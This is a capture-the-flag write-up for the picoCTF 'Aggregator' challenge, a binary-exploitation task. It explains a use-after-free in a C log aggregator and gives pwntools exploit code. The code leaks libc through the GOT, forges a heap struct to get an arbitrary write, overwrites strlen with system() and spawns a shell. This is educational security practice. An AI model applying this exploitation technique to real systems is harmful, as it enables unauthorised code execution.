# Level 4 - Aggregator

```
Aggregator
I wrote a program to help me synthesize my log files. You can edit the log files to add annotations that will print out aggregated information. Because the original program that outputs the logs was a bit faulty, I also included the ability to clear a single day of logs. 
Find my aggregator running on shell2017.picoctf.com:9611. aggregator.c aggregator

 HINTS
Does it look like there is a stack vulnerability?
```

This is a Use After Free vulnerability, It took a long time to find it :(

 Create an item on the heap
 Then free that item (memory is freed)
 Then create a new item on heap that isn't freed, by doing an invalid command
 Then trigger a Use After Free on that overwritten memory by doing an action

So we start by doing the allocating/freeing of a date entry, and then using an aggregate action
```python
  year  = 1022
  month = 1
  day   = 1
  date = "%2.2d-%2.2d-%4.4d" %(month,day,year)
  date_monthyear = "%2.2d-%4.4d" %(month,year)

  #Add date with easily findable item number 
  add_date_mdy(r, date, 0x4141414142424242)
  remove_date_mdy(r, date)

  #Overwrite the area that is now freed, with an invalid command
  payload  = ''
  payload += 'A'*(5*8)
  create_aggregate(r, '+', date_monthyear)
```

Looking at the relevant aggregation code:
```C
    while (ch != NULL) {
        if (ch->size > 0) {
            agg = ch->data[0];
            i = 1;
            break;
        }
        ch = ch->next;
    }
```

with the asm:
```asm
     0x400f87 <db_aggregate_month+101>    mov    rax, qword ptr [rax]
     0x400f8a <db_aggregate_month+104>    mov    qword ptr [rbp - 8], rax
     0x400f8e <db_aggregate_month+108>    mov    qword ptr [rbp - 0x10], 1
     0x400f96 <db_aggregate_month+116>    jmp    0x400fab                      <0x400fab>
     0x400f96 <db_aggregate_month+116>    jmp    0x400fab                      <0x400fab>
     0x400fab <db_aggregate_month+137>    jmp    0x400fff                      <0x400fff>
     0x400fff <db_aggregate_month+221>    cmp    qword ptr [rbp - 0x18], 0
```
where `[rbp - 0x18]` is the heap memory location of the invalid command we entered.

Keep stepping through:
```asm
     0x400fdd <db_aggregate_month+187>    mov    rax, qword ptr [rbp - 0x18]
     0x400fe1 <db_aggregate_month+191>    mov    rax, qword ptr [rax + 0x18]
     0x400fe5 <db_aggregate_month+195>    cmp    rax, qword ptr [rbp - 0x10]
     0x400fe9 <db_aggregate_month+199>    ja     db_aggregate_month+141        <0x400faf>
```
Here the pointer value to our invalid command is loaded into rax+0x18, and loaded back into RAX
If the value at that location is above 1 (`[rbp-0x10] = 0x1`), then jump.

So the C code is expecting this struct at this location:
```C
struct data_table_chain {
    data_t *data;
    day_t day;
    size_t capacity;
    size_t size;
    dbchain *next;
};
```
This is great, because it'll give us an arbitrary read primitive!

Modify our payload to:
```python
  payload  = ''
  payload += p64(0x601f58) # GOT address of setvbuf
  payload += p64(0x000000) 
  payload += p64(0x0000FF) # ch->capacity
  payload += p64(0x000001) # ch->size
  payload += p64(0x000000) # ch->next... just null is fine...
    
  r.sendline(payload)
```
So we set the data pointer we want to read to an address in the GOT that points to libc.
Then we read back the "aggregated" value. Which is just the address as an integer added to zero.

```python
  r.recvline()
  leak = r.recvline(keepends=False)
  libc.address = int(leak) - libc.symbols['setvbuf']
  print "Libc base = %x" %(libc.address)
  print "Libc system() = %x" %(libc.symbols['system'])
```
Score... We're making progress.

Now how do we find an arbitrary write primitive...
Lets see about doing the same trick with an update to an existing item?
Start simple and see if we can get a crash
```python
  year  = 1022
  month = 12
  day   = 12
  date = "%2.2d-%2.2d-%4.4d" %(month,day,year)
  date_monthyear = "%2.2d-%4.4d" %(month,year)

  #Add date with easily findable item number 
  add_date_mdy(r, date, 0x4141414142424242)
  remove_date_mdy(r, date)

  #Overwrite the area that is now freed, with an invalid command
  payload  = ''
  payload += p64(0x601f58) # GOT address of ...
  payload += p64(0xAAAAAA)
  payload += p64(0xBBBBBB)
  payload += p64(0xCCCCCC) 
  payload += p64(0xDDDDDD) 
  r.sendline(payload)

  add_date_mdy(r, date, 0x4141414142424242)
```
Great. This gets a segfault at `chain_get+47`. it uses the 0xDDDDDD+0x8 as a pointer. This makes sense, we saw that was the next pointer. So lets zero that one.
Lets also set that location as a breakpoint:
```python
  if args.dbg:
    gdb.attach(r, """
    vmmap
    b *chain_get+47
    """)
```

Now we look to see what's happening around the `db_add()` calling `chain_get()`
```C
void db_add(db_t D, struct tm* when, data_t data_value) {
    ymon_t ymon = make_ymon(when->tm_year, when->tm_mon);
    day_t day = when->tm_mday;
    dbchain *ch = chain_get(D, ymon, day);
    if (ch == NULL) {
        ch = chain_add(D, ymon, day);
    }
    chain_append(ch, data_value);
}
```

`chain_add()` is a complicated function with lots of stuff in it. `chain_append()` seems more manageable

```C
void chain_append(dbchain *ch, data_t data_value) {
    if (ch->size == ch->capacity) {
        ch->capacity = ch->capacity * 2;
        ch->data = xrealloc(ch->data, ch->capacity * sizeof(data_t));
    }
    ch->data[ch->size] = data_value;
    ch->size++;
}
```

Nice... So we just need a valid pointer for `chain_get()` to return a pointer to our structure. mmmm
```C
dbchain *chain_get(db_t D, ymon_t y, day_t day) {
    dbchain *ch = chain_head(D, y);
    while (ch != NULL) {
        if (ch->day == day) {
            return ch;
        }
        ch = ch->next;
    }
    return NULL;
}
```

In `chain_get()` make sure we follow the right code path. This got me for a bit:
```asm
   0x400b15 <chain_get+47>    movzx  eax, byte ptr [rax + 8]
   0x400b19 <chain_get+51>    cmp    al, byte ptr [rbp - 0x20]
   0x400b1c <chain_get+54>    jne    chain_get+62                  <0x400b24>
```
I need to make sure that the second value in our struct is equal to the value of the day we used.
Since we saw that `ch->data[ch->size] = data_value;` we need to make sure to subtract the location we want to write to with 8.

Now we just need to figure out what to overwrite. I usually look at what the input buffer pointer is passed to, if we want to use `system()` then we need it to be passed as the first argument somewhere:

Ah HA: right in `main()` the pointer with user input is passed to `strlen()`
```C
    for (char *line_buffer = readline(); line_buffer != NULL; line_buffer = readline()) {
        size_t line_length = strlen(line_buffer);
```
So we need to overwrite `strlen()` in the GOT: `0x601f00 (strlen@got.plt) —> 0x4007d6 (strlen@plt+6)`

So lets try:
```python
  #Overwrite the area that is now freed, with an invalid command
  payload  = ''
  payload += p64(0x601f00-8) # GOT address of strlen - 8
  payload += p64(0x0000000C) # This holds the day we used above
  payload += p64(0xFFFFFFFF) 
  payload += p64(0x00000001) # ch->size
  payload += p64(0x00000000) #

  r.sendline(payload)
 
  #Send value to overwrite the data pointer with
  add_date_mdy(r, date, libc.symbols['system'])
 
  r.sendline('/bin/sh -i') 
  # Drop to interactive console
  r.interactive()
```

And we have a shell :)

I had a fairly hard time spoting the UAF bug and didn't solve it in time to claim the 190 points.

Full [exploit](./exploit.py) is checked in 










